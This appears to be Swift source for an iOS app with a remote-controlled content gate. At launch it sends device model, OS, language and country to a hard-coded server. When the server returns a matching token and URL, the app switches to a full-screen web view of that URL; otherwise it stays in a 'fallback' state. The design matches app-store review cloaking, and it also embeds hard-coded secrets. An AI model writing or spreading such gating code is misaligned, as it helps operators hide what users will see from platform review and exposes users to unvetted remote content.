

import SwiftUI
import UIKit
import WebKit
import UniformTypeIdentifiers
import PhotosUI

enum CoreConfigKey: String {
    case validationToken, hostEndpoint, authSecret, cachedURLKey, cachedTokenKey
}

let CoreSettings: [CoreConfigKey: Any] = [
    .validationToken: "GJDFHDFHFDJGSDAGKGHK",
    .hostEndpoint: "https://wallen-eatery.space/ios-st-8/server.php",
    .authSecret: "Bs2675kDjkb5Ga",
    .cachedURLKey: "storedTrustedURL",
    .cachedTokenKey: "storedVerificationToken",
]

func coreSettingValue<T>(_ key: CoreConfigKey) -> T {
    return CoreSettings[key] as! T
}

enum KeyVaultError: Error {
    case invalidStatus(OSStatus)
    case recordNotFound
}

func keyVaultStore(key: String, value: String) throws {
    let data = Data(value.utf8)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    let attributes: [String: Any] = [kSecValueData as String: data]
    let status = SecItemCopyMatching(query as CFDictionary, nil)
    if status == errSecSuccess {
        let updateStatus = SecItemUpdate(query as CFDictionary, attributes as CFDictionary)
        guard updateStatus == errSecSuccess else { throw KeyVaultError.invalidStatus(updateStatus) }
    } else if status == errSecItemNotFound {
        var newItem = query
        newItem[kSecValueData as String] = data
        let addStatus = SecItemAdd(newItem as CFDictionary, nil)
        guard addStatus == errSecSuccess else { throw KeyVaultError.invalidStatus(addStatus) }
    } else {
        throw KeyVaultError.invalidStatus(status)
    }
}

func keyVaultRetrieve(key: String) throws -> String {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    if status == errSecSuccess {
        guard let data = result as? Data,
              let str = String(data: data, encoding: .utf8) else {
            throw KeyVaultError.invalidStatus(status)
        }
        return str
    } else if status == errSecItemNotFound {
        throw KeyVaultError.recordNotFound
    } else {
        throw KeyVaultError.invalidStatus(status)
    }
}

func systemLocaleCode() -> String {
    let code = Locale.preferredLanguages.first ?? "en"
    return code.components(separatedBy: "-").first?.lowercased() ?? "en"
}

func systemRegionCode() -> String? {
    Locale.current.regionCode
}

func systemDeviceModel() -> String {
    var sys = utsname()
    uname(&sys)
    let mirror = Mirror(reflecting: sys.machine)
    return mirror.children.reduce(into: "") { acc, element in
        if let value = element.value as? Int8, value != 0 {
            acc.append(Character(UnicodeScalar(UInt8(value))))
        }
    }
}

func systemDescription() -> String {
    "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
}

func makeControlURL() -> URL? {
    var comps = URLComponents(string: coreSettingValue(.hostEndpoint) as String)
    comps?.queryItems = [
        URLQueryItem(name: "p", value: coreSettingValue(.authSecret) as String),
        URLQueryItem(name: "os", value: systemDescription()),
        URLQueryItem(name: "lng", value: systemLocaleCode()),
        URLQueryItem(name: "devicemodel", value: systemDeviceModel())
    ]
    if let country = systemRegionCode() {
        comps?.queryItems?.append(URLQueryItem(name: "country", value: country))
    }
    return comps?.url
}

final class GateAccessManager: ObservableObject {
    @MainActor @Published var state: StatusPhase = .idle
    
    enum StatusPhase {
        case idle, validating
        case authorized(token: String, url: URL)
        case fallback
    }
    
    func beginAccess() {
        if let savedURLString = UserDefaults.standard.string(forKey: coreSettingValue(.cachedURLKey)),
           let savedURL = URL(string: savedURLString),
           let savedToken = try? keyVaultRetrieve(key: coreSettingValue(.cachedTokenKey)),
           savedToken == (coreSettingValue(.validationToken) as String) {
            Task { @MainActor in
                state = .authorized(token: savedToken, url: savedURL)
            }
            return
        }
        Task { await retrieveAccessData() }
    }
    
    private func retrieveAccessData() async {
        await MainActor.run { state = .validating }
        guard let url = makeControlURL() else {
            await MainActor.run { state = .fallback }
            return
        }
        var retry = 0
        while true {
            retry += 1
            do {
                let content = try await downloadText(from: url)
                let parts = content.trimmingCharacters(in: .whitespacesAndNewlines).components(separatedBy: "#")
                if parts.count == 2,
                   parts[0] == (coreSettingValue(.validationToken) as String),
                   let validURL = URL(string: parts[1]) {
                    UserDefaults.standard.set(validURL.absoluteString, forKey: coreSettingValue(.cachedURLKey))
                    try? keyVaultStore(key: coreSettingValue(.cachedTokenKey), value: parts[0])
                    await MainActor.run {
                        state = .authorized(token: parts[0], url: validURL)
                    }
                    return
                } else {
                    await MainActor.run { state = .fallback }
                    return
                }
            } catch {
                let delay = min(pow(2.0, Double(min(retry, 6))), 30.0)
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
        }
    }
    
    private func downloadText(from url: URL) async throws -> String {
        let (data, _) = try await URLSession.shared.data(from: url)
        return String(decoding: data, as: UTF8.self)
    }
}

@available(iOS 14.0, *)
final class PortalViewController: UIViewController, WKUIDelegate, WKNavigationDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate {
    
    var loadingState: ((Bool) -> Void)?
    private var webView: WKWebView!
    private var sourceURL: URL
    fileprivate var fileCallback: (([URL]?) -> Void)?
    
    init(sourceURL: URL) {
        self.sourceURL = sourceURL
        super.init(nibName: nil, bundle: nil)
        configureWebView()
    }
    
    required init?(coder: NSCoder) { fatalError() }
    override var prefersStatusBarHidden: Bool { true }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        if #available(iOS 11.0, *) {
            webView.insetsLayoutMarginsFromSafeArea = false
            webView.scrollView.contentInsetAdjustmentBehavior = .never
        }
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        loadingState?(true)
        webView.load(URLRequest(url: sourceURL))
    }
    
    private func configureWebView() {
        let config = WKWebViewConfiguration()
        config.preferences.javaScriptEnabled = true
        config.websiteDataStore = .default()
        webView = WKWebView(frame: .zero, configuration: config)
        webView.uiDelegate = self
        webView.navigationDelegate = self
        webView.scrollView.bounces = false
        webView.scrollView.minimumZoomScale = 1.0
        webView.scrollView.maximumZoomScale = 1.0
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        loadingState?(false)
    }
    
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        loadingState?(false)
    }
}

@available(iOS 14.0, *)
extension PortalViewController {
    func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
        fileCallback?(urls)
    }
    
    func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
        fileCallback?(nil)
    }
    
    @available(iOS 18.4, *)
    func webView(_ webView: WKWebView,
                 runOpenPanelWith parameters: WKOpenPanelParameters,
                 initiatedByFrame frame: WKFrameInfo,
                 completionHandler: @escaping ([URL]?) -> Void) {
        self.fileCallback = completionHandler
        let alert = UIAlertController(title: "Choose File", message: nil, preferredStyle: .actionSheet)
        alert.addAction(UIAlertAction(title: "Photo/Video", style: .default) { _ in
            var config = PHPickerConfiguration(photoLibrary: .shared())
            config.selectionLimit = 1
            config.filter = .any(of: [.images, .videos])
            let picker = PHPickerViewController(configuration: config)
            picker.delegate = self
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Files", style: .default) { _ in
            let picker = UIDocumentPickerViewController(forOpeningContentTypes: [.item], asCopy: true)
            picker.delegate = self
            picker.allowsMultipleSelection = false
            self.present(picker, animated: true)
        })
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel) { _ in
            completionHandler(nil)
        })
        present(alert, animated: true)
    }
    
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        for provider in results.map({ $0.itemProvider }) {
            if provider.hasItemConformingToTypeIdentifier(UTType.image.identifier) {
                provider.loadFileRepresentation(forTypeIdentifier: UTType.image.identifier) { url, _ in
                    if let url = url {
                        DispatchQueue.main.async {
                            self.fileCallback?([url])
                        }
                    }
                }
            }
        }
    }
}

@available(iOS 14.0, *)
struct PortalContainerView: UIViewControllerRepresentable {
    let url: URL
    @Binding var loading: Bool
    
    func makeUIViewController(context: Context) -> PortalViewController {
        let vc = PortalViewController(sourceURL: url)
        vc.loadingState = { active in
            DispatchQueue.main.async {
                loading = active
            }
        }
        return vc
    }
    
    func updateUIViewController(_ vc: PortalViewController, context: Context) {}
}

